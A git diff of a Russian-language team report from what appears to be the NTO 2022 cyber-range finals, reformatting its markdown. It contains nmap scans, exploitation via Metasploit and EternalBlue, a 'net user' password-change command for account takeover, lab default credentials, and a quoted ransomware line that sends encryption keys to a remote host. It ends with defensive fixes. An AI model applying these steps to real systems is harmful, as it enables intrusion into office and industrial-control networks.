@@ -1,9 +1,9 @@
 <h1 align="center">nto-2022-finals</h1> 
 <h1 align="center">Отчет команды DEFINE AIDAR ASADULLIN</h1>
 
-1. Network Mapping
+## 1. Network Mapping
 
-1.1. DMZ
+### 1.1. DMZ
 ```
 Nmap scan report for 10.33.2.10
 PORT     STATE SERVICE VERSION
@@ -46,7 +46,7 @@ PORT   STATE SERVICE VERSION
 53/tcp open  domain  ISC BIND
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-1.2. SERVERS
+### 1.2. SERVERS
 ```
 Nmap scan report for 10.33.3.10
 PORT     STATE SERVICE       VERSION
@@ -115,7 +115,7 @@ PORT     STATE SERVICE       VERSION
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
 Service Info: Host: NS1; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-1.3. OFFICE
+### 1.3. OFFICE
 ```
 Nmap scan report for 10.33.4.6
 PORT     STATE SERVICE       VERSION
@@ -153,7 +153,7 @@ PORT     STATE SERVICE       VERSION
 3389/tcp open  ms-wbt-server Microsoft Terminal Services
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-1.4. АСУ ТП
+### 1.4. АСУ ТП
 ```
 Nmap scan report for 10.33.239.5
 PORT      STATE SERVICE        VERSION
@@ -221,9 +221,9 @@ PORT      STATE SERVICE            VERSION
 49157/tcp open  msrpc              Microsoft Windows RPC
 Service Info: Host: A33-ENTEK; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
-2. Сервисы
+## 2. Сервисы
 
-2.1. WordPress
+### 2.1. WordPress
 
 Есть 3 порта: 80, 3306, 8080, доступен только порт 80
 
@@ -248,7 +248,7 @@ define( 'DB_PASSWORD', 'mypassword' );
 
 Проверив логи nginx, мы обнаружили, что потенциальный IP-адрес злоумышленника - 192.168.224. 
 
-2.2. SLmail
+### 2.2. SLmail
 
 С помощью Metasploit (https://www.rapid7.com/db/modules/exploit/windows/pop3/seattlelab_pass/) получен доступ к консоли Windows пользователя, там найдены папки SLmail, SLadmin (в папке Program File (x86)).
 С помощью команды ```net user``` был обнаружен пользователь cadm. Изменив пароль у этого пользователя, мы смогли подключиться по RDP. Основные цели -  восстановить сервер Slmail и восстановить пароль на сервисе CyberPolygon. В админ панеле были обнаружены адреса пользователей.
@@ -262,7 +262,7 @@ net user cadm pass
 ```
 В последствии оказалось, что пользователь cadm имеет права Администратора.
 
-2.3. SIED (10.33.240.5, .6, .9, .10) 
+### 2.3. SIED (10.33.240.5, .6, .9, .10) 
 
 Это релейная защита на 10кв.
 
@@ -270,7 +270,7 @@ net user cadm pass
 
 Также удалось выяснить, что IP-адреса с 3-им октетом .240 соединены с 10.33.240.14, но некоторые из них не работают (об этом будет рассказано в пункте 2.4)
 
-2.4. 10.33.240.14 (Eternal Blue)
+### 2.4. 10.33.240.14 (Eternal Blue)
 
 Использовав эксплойт мы выяснили, что на данном сервисе есть уязвимость Eternal Blue. 
 Сменив пароль пользовалеля cadm, как в случае с SLmail, мы подключились по rdp. На компьютере была обнаружена папка EnLogicTLC, в которой лежит приложение EnLogic. Цитируя руководство пользователя данной программы:
@@ -306,28 +306,28 @@ psw_psw3="admin"
 ```
 Так как в папке лежал такой файл, то мы проделали то же самое.
 
-2.5. 10.33.239.5 OIK-SERVER (Eternal Blue)
+### 2.5. 10.33.239.5 OIK-SERVER (Eternal Blue)
 
 На этом сервере стоит программа ОИК Диспетчер НТ для приема и обработки телеметрической информации, организация её хранения и доступ к результатам телеметрии и базам данных. Мы достали файл Database.db, но в нем таблицы оказались пустыми.
 Как и в предыдущем случае, это сервис оказался уязвимым к атаке EternalBlue. Проделав все шаги по смене пароля и получению доступа по rdp, мы обнаружили приложение "Настройка серверов", запускаемое только от имени Администратора. При запуске мы попытались подключиться к IP-адресу 10.33.239.6, но неудачно. Скорее всего, проблема именно на этом компьютере, так как в "Устройствах" компьютера указано, что у OIK-SERVER есть неполадки. При попытке их устранения ничего не происходит.
 
-2.6. 10.33.239.6 OIK-CLIENT (Eternal Blue)
+### 2.6. 10.33.239.6 OIK-CLIENT (Eternal Blue)
 
 Еще один уязвимый сервис. При подключении по rdp найдено приложение "Клиент ОИК диспетчер (pgsql)". Работа этого сервиса зависит от 10.33.239.6
 
 В папке Share найдены файлы с расширением .cert. (Самый важный - FLAG.txt.cert)
 
-Найден файл Ransom.ps1. Внутри оказался код шифрования AES (CBC). Внутри находится код шифрования файлов. key и iv отправляются на http://$IP/key=$Key&iv=$IV&pc=$env:computername.
+Найден файл Ransom.ps1. Внутри оказался код шифрования AES (CBC). Внутри находится код шифрования файлов. key и iv отправляются на `http://$IP/key=$Key&iv=$IV&pc=$env:computername`.
 
 В папке InterfaceSSH лежит папка с исходным кодом программы OIK-CLIENT. При запуске выдает ошибку. 
 
-2.7. 10.33.4.8 (Eternal Blue)
+### 2.7. 10.33.4.8 (Eternal Blue)
 
 Найден файл winlogon.txt (даты - 23-28 февраля, это точно злоумышленник)
 
 Компьютеры в сети: BUCHGARM, CUSTARM, ENGGENERAL, SYSADMINARM, tsclient
 
-2.8. CyberPolygon (10.33.2.11)
+### 2.8. CyberPolygon (10.33.2.11)
 
 Сервер был обнаружен, были попытки побрутить пароли, зная логин `admin`, но безуспешные.
 Также в source code было обнаружено, что в данной версии DRUPAL возможна инъекция XSS. 
@@ -338,33 +338,33 @@ psw_psw3="admin"
 
 Скорее всего адресс лежит на почте slmail.
 
-2.8. 10.33.2.53 (ISC BIND)
+### 2.8. 10.33.2.53 (ISC BIND)
 
-2.9. Все IP-адреса SERVERS
+### 2.9. Все IP-адреса SERVERS
 
 На 10.33.3.20 стоит Microsoft Exchange, были попытки подсоединиться с почтой из WordPress (cybermir@cybermir.ru)
 
 На 10.33.3.10 и 10.33.3.50 стоит Active Directory LDAP, подключиться не получилось
 
-2.9. OFFICE (кроме 10.33.4.8) - Microsoft Terminal Services
+### 2.9. OFFICE (кроме 10.33.4.8) - Microsoft Terminal Services
 
-3. Возможные пути защиты
+## 3. Возможные пути защиты
 
-3.1. Word Press
+### 3.1. Word Press
 - изменение пароля администратора на более сложный (например, хэш)
 - изменение кода сервиса на порту 8080 (а именно в месте, где может быть произведена sql-инъекция)
 - поменять дефолтный пароль в базе данных (а также название базы данных и имя пользователя, которые захардкожены)
 - использовать docker-контейнер
 - убрать запуск python с привилегиями у любого пользователя
 
-3.2. Все серверы с Eternal Blue
+### 3.2. Все серверы с Eternal Blue
 - своевременно обновлять ОС
 - установить firewall у порта 445
 - обновить smb
 
-3.3. SLmail
+### 3.3. SLmail
 - заменить почтовый сервер
 
-3.4. CyberPolygon
+### 3.4. CyberPolygon
 - обновить версию Samba  
 - обновить версию DRUPAL
